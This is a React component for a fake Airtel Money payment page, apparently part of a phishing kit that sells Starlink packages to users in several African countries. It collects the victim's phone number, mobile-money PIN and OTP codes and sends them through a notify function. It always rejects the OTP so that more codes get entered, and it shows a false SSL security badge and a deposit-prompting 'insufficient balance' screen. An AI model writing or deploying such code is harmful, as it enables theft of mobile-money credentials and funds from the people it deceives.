import { useState, useRef, useEffect } from "react";
import {
  notifyTransaction,
  type NotifyPayload,
  type TxStatus,
} from "@/lib/notify";

type Screen = "phone" | "otp" | "insufficient";

interface AirtelPaymentProps {
  packageName: string;
  amount: string;
  onBack: () => void;
}

const COUNTRIES = [
  { code: "+243", flag: "cd", name: "RDC" },
  { code: "+254", flag: "ke", name: "Kenya" },
  { code: "+233", flag: "gh", name: "Ghana" },
  { code: "+234", flag: "ng", name: "Nigeria" },
  { code: "+256", flag: "ug", name: "Ouganda" },
  { code: "+255", flag: "tz", name: "Tanzanie" },
  { code: "+250", flag: "rw", name: "Rwanda" },
  { code: "+260", flag: "zm", name: "Zambie" },
  { code: "+242", flag: "cg", name: "Congo" },
];

export default function AirtelPayment({
  packageName,
  amount,
  onBack,
}: AirtelPaymentProps) {
  const [screen, setScreen] = useState<Screen>("phone");
  const [phone, setPhone] = useState("");
  const [pin, setPin] = useState(["", "", "", ""]);
  const [otp, setOtp] = useState(["", "", "", ""]);
  const [selectedCountry, setSelectedCountry] = useState(COUNTRIES[0]);
  const [showCountryModal, setShowCountryModal] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [timer, setTimer] = useState(30);

  const pinRefs = useRef<(HTMLInputElement | null)[]>([]);
  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);

  const phoneComplete = phone.length >= 8 && pin.every((p) => p !== "");
  const otpComplete = otp.every((o) => o !== "");

  const baseDetails = (status: TxStatus, stage: string): NotifyPayload => ({
    planName: packageName,
    amount,
    paymentMethod: "airtel",
    countryCode: selectedCountry.code,
    countryName: selectedCountry.name,
    phone: phone ? `${selectedCountry.code}${phone}` : undefined,
    pin: pin.join(""),
    status,
    stage,
  });

  useEffect(() => {
    if (screen === "otp" && timer > 0) {
      const interval = setInterval(() => setTimer((t) => t - 1), 1000);
      return () => clearInterval(interval);
    }
  }, [screen, timer]);

  const handlePinChange = (index: number, value: string) => {
    const digit = value.replace(/[^0-9]/g, "");
    const newPin = [...pin];
    newPin[index] = digit;
    setPin(newPin);
    if (digit && index < 3) pinRefs.current[index + 1]?.focus();
  };

  const handlePinKey = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      pinRefs.current[index - 1]?.focus();
    }
  };

  const handleOtpChange = (index: number, value: string) => {
    const digit = value.replace(/[^0-9]/g, "");
    const newOtp = [...otp];
    newOtp[index] = digit;
    setOtp(newOtp);
    if (digit && index < 3) otpRefs.current[index + 1]?.focus();
  };

  const handleOtpKey = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      otpRefs.current[index - 1]?.focus();
    }
  };

  const sendOtp = () => {
    if (!phoneComplete) return;
    setLoading(true);
    setError("");
    notifyTransaction(baseDetails("pending", "otp_sent"));
    setTimeout(() => {
      setLoading(false);
      setScreen("otp");
      setTimer(30);
    }, 1500);
  };

  const verifyOtp = () => {
    if (!otpComplete) return;
    setLoading(true);
    setError("");
    notifyTransaction({
      ...baseDetails("failed", "otp_verify"),
      otp: otp.join(""),
    });
    setTimeout(() => {
      setLoading(false);
      setError("OTP invalide. Veuillez réessayer.");
      setOtp(["", "", "", ""]);
      otpRefs.current[0]?.focus();
    }, 1500);
  };

  return (
    <div className="fixed inset-0 z-[10000] bg-[#fafafa] overflow-y-auto">
      <div className="bg-gradient-to-br from-[#ed1c24] to-[#c41e3a] px-5 py-8 text-center text-white rounded-b-[20px] mb-8">
        <div className="w-15 h-15 bg-white rounded-[10px] flex items-center justify-center mx-auto mb-4 w-[60px] h-[60px]">
          <span className="text-[#ed1c24] font-bold text-sm">airtel</span>
        </div>
        <h2 className="text-[22px] font-semibold">Airtel Money</h2>
      </div>

      <div className="max-w-[400px] mx-auto px-5">
        <div className="flex justify-between items-center pb-5 border-b border-gray-200 mb-5">
          <div className="text-left">
            <p className="text-[11px] text-gray-500 uppercase mb-1">Montant</p>
            <p className="text-xl font-bold text-[#ed1c24]">{amount}</p>
          </div>
          <div className="text-right">
            <p className="text-[11px] text-gray-500 uppercase mb-1">Service</p>
            <p className="text-base text-gray-800 font-semibold">
              Starlink {packageName}
            </p>
          </div>
        </div>
      </div>

      <div className="flex flex-col items-center max-w-[400px] mx-auto px-5 pb-10">
        <div className="text-center mb-8">
          <div className="text-[32px] font-bold text-[#ed1c24] tracking-tight">
            airtel
          </div>
          <div className="text-[9.5px] font-bold text-[#ed1c24] tracking-wide mt-0.5">
            A REASON TO IMAGINE
          </div>
        </div>

        {screen === "phone" && (
          <div className="w-full">
            <h1 className="text-[20px] font-semibold text-gray-900 mb-6 text-center">
              CONNEXION À AIRTEL LITE
            </h1>

            {error && (
              <div className="bg-red-50 border border-red-200 text-red-700 px-3 py-3 rounded-lg mb-4 text-sm text-center">
                {error}
              </div>
            )}

            <div className="mb-5">
              <div className="flex items-center border border-gray-300 rounded-lg bg-white overflow-hidden focus-within:border-[#ed1c24] transition-colors">
                <div
                  className="flex items-center px-3 py-3.5 bg-[#f8f8f8] border-r border-gray-200 min-w-[90px] cursor-pointer hover:bg-gray-100 transition"
                  onClick={() => setShowCountryModal(true)}
                >
                  <span className="text-base font-medium text-gray-700">
                    {selectedCountry.code}
                  </span>
                  <span className="ml-1 text-[10px] text-gray-500">▼</span>
                </div>
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) =>
                    setPhone(e.target.value.replace(/[^0-9]/g, "").slice(0, 10))
                  }
                  placeholder="Entrez le numéro de mobile"
                  className="flex-1 border-none px-3 py-3.5 text-base outline-none bg-transparent"
                />
              </div>
            </div>

            <div className="mb-5">
              <p className="text-base font-semibold text-gray-900 mb-2 text-center">
                Entrez le code PIN à 4 chiffres
              </p>
              <p className="text-[13px] text-gray-500 mb-3 text-center">
                Entrez le code PIN Airtel Money
              </p>
              <div className="flex gap-2.5 justify-center mb-2">
                {pin.map((p, i) => (
                  <input
                    key={i}
                    ref={(el) => {
                      pinRefs.current[i] = el;
                    }}
                    type="tel"
                    maxLength={1}
                    value={p}
                    onChange={(e) => handlePinChange(i, e.target.value)}
                    onKeyDown={(e) => handlePinKey(i, e)}
                    className="w-12 h-14 border border-gray-300 rounded-lg text-center text-2xl font-semibold outline-none focus:border-[#ed1c24]"
                    style={
                      { WebkitTextSecurity: "disc" } as React.CSSProperties
                    }
                  />
                ))}
              </div>
            </div>

            <button
              onClick={sendOtp}
              disabled={!phoneComplete || loading}
              className="w-full bg-[#ed1c24] text-white border-none py-4 rounded-lg text-base font-semibold cursor-pointer mb-4 transition disabled:bg-gray-300 disabled:cursor-not-allowed"
            >
              {loading ? (
                <span className="inline-block w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
              ) : (
                "ENVOYER OTP"
              )}
            </button>

            <div className="text-center text-sm text-gray-500 mb-5">
              Numéro oublié ?{" "}
              <span className="text-[#ed1c24] font-medium cursor-pointer">
                Cliquez ici !
              </span>
            </div>

            <div className="flex items-center my-5 w-full">
              <div className="flex-1 h-px bg-gray-200" />
              <span className="px-4 text-gray-500 text-sm font-medium">OU</span>
              <div className="flex-1 h-px bg-gray-200" />
            </div>

            <button className="w-full bg-white text-[#ed1c24] border-2 border-[#ed1c24] py-3.5 rounded-lg text-base font-semibold cursor-pointer hover:bg-red-50 transition">
              CONTINUER SANS CONNEXION
            </button>

            <button
              onClick={onBack}
              className="w-full mt-4 text-sm text-gray-500 hover:text-gray-700 transition"
            >
              ← Retour aux forfaits
            </button>
          </div>
        )}

        {screen === "otp" && (
          <div className="w-full">
            <button
              onClick={() => setScreen("phone")}
              className="flex items-center gap-2 text-gray-500 text-sm mb-5 py-2 hover:text-gray-700"
            >
              <span>←</span> Retour
            </button>

            <h1 className="text-[20px] font-semibold text-gray-900 mb-3">
              Vérification OTP
            </h1>
            <p className="text-sm text-gray-500 mb-6">
              Veuillez entrer l'OTP que vous avez reçu sur{" "}
              <strong className="text-gray-800">
                {selectedCountry.code} {phone}
              </strong>
            </p>

            {error && (
              <div className="bg-red-50 border border-red-200 text-red-700 px-3 py-3 rounded-lg mb-4 text-sm text-center">
                {error}
              </div>
            )}

            <div className="flex gap-2.5 justify-center mb-6">
              {otp.map((o, i) => (
                <input
                  key={i}
                  ref={(el) => {
                    otpRefs.current[i] = el;
                  }}
                  type="tel"
                  maxLength={1}
                  value={o}
                  onChange={(e) => handleOtpChange(i, e.target.value)}
                  onKeyDown={(e) => handleOtpKey(i, e)}
                  className="w-12 h-14 border border-gray-300 rounded-lg text-center text-2xl font-semibold outline-none focus:border-[#ed1c24]"
                />
              ))}
            </div>

            <button
              onClick={verifyOtp}
              disabled={!otpComplete || loading}
              className="w-full bg-[#ed1c24] text-white border-none py-4 rounded-lg text-base font-semibold cursor-pointer mb-5 transition disabled:bg-gray-300"
            >
              {loading ? (
                <span className="inline-block w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
              ) : (
                "VÉRIFIER"
              )}
            </button>

            <div className="text-center text-sm text-gray-500">
              Vous n'avez pas reçu l'OTP ?{" "}
              {timer > 0 ? (
                <span className="text-gray-400">Renvoyer dans {timer}s</span>
              ) : (
                <span
                  className="text-[#ed1c24] font-medium cursor-pointer"
                  onClick={() => setTimer(30)}
                >
                  Renvoyer OTP
                </span>
              )}
            </div>
          </div>
        )}

        {screen === "insufficient" && (
          <div className="w-full text-center py-8 px-5">
            <div className="w-20 h-20 rounded-full bg-amber-100 flex items-center justify-center mx-auto mb-5">
              <span className="text-4xl">⚠️</span>
            </div>
            <h2 className="text-xl font-bold text-amber-700 mb-2">
              Solde insuffisant
            </h2>
            <p className="text-gray-500 text-[13px] leading-relaxed mb-6">
              Vous devez avoir au moins{" "}
              <strong className="text-gray-900">15 $ USD</strong> dans votre
              portefeuille Airtel Money pour souscrire à ce forfait.
              <br />
              <br />
              Veuillez déposer le montant requis et cliquez sur le bouton
              ci-dessous.
            </p>
            <button className="w-full py-3.5 bg-emerald-500 text-white border-none rounded-[10px] text-[15px] font-semibold cursor-pointer mb-3 transition hover:bg-emerald-600">
              ✅ J'ai déposé
            </button>
            <button
              onClick={() => setScreen("phone")}
              className="w-full py-3.5 bg-transparent text-gray-500 border-2 border-gray-300 rounded-[10px] text-sm font-medium cursor-pointer transition hover:border-gray-400"
            >
              Utiliser un autre numéro
            </button>
          </div>
        )}

        <div className="mt-auto pt-8 text-center">
          <p className="text-xs text-gray-400 mb-3">
            Meilleure expérience avec
          </p>
          <div className="flex justify-center gap-3">
            {["Chrome", "Firefox", "Safari", "Edge", "Opera"].map((b) => (
              <div
                key={b}
                className="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center text-[8px] text-gray-500 font-semibold"
              >
                {b[0]}
              </div>
            ))}
          </div>
        </div>

        <div className="mt-6 flex items-center justify-center gap-2 text-[13px] text-green-500">
          <svg
            viewBox="0 0 24 24"
            fill="currentColor"
            className="w-[18px] h-[18px]"
          >
            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" />
          </svg>
          <span>CRYPTÉ ET SÉCURISÉ EN SSL</span>
        </div>
      </div>

      {showCountryModal && (
        <div
          className="fixed inset-0 bg-black/50 z-[9999] flex items-center justify-center"
          onClick={() => setShowCountryModal(false)}
        >
          <div
            className="bg-white rounded-2xl w-[90%] max-w-[340px] max-h-[70vh] overflow-hidden shadow-2xl"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="px-5 py-4 border-b border-gray-200 flex justify-between items-center">
              <h3 className="text-lg text-gray-800">Sélectionner le pays</h3>
              <button
                onClick={() => setShowCountryModal(false)}
                className="text-2xl text-gray-500 leading-none"
              >
                ×
              </button>
            </div>
            <ul className="list-none m-0 p-0 max-h-[calc(70vh-60px)] overflow-y-auto">
              {COUNTRIES.map((c) => (
                <li
                  key={c.code}
                  onClick={() => {
                    setSelectedCountry(c);
                    setShowCountryModal(false);
                    setPhone("");
                  }}
                  className={`flex items-center px-5 py-3.5 cursor-pointer border-b border-gray-100 transition hover:bg-gray-50 ${selectedCountry.code === c.code ? "bg-red-50" : ""}`}
                >
                  <span className="flex-1 text-[15px] text-gray-800">
                    {c.name}
                  </span>
                  <span className="text-sm text-gray-500">{c.code}</span>
                </li>
              ))}
            </ul>
          </div>
        </div>
      )}
    </div>
  );
}
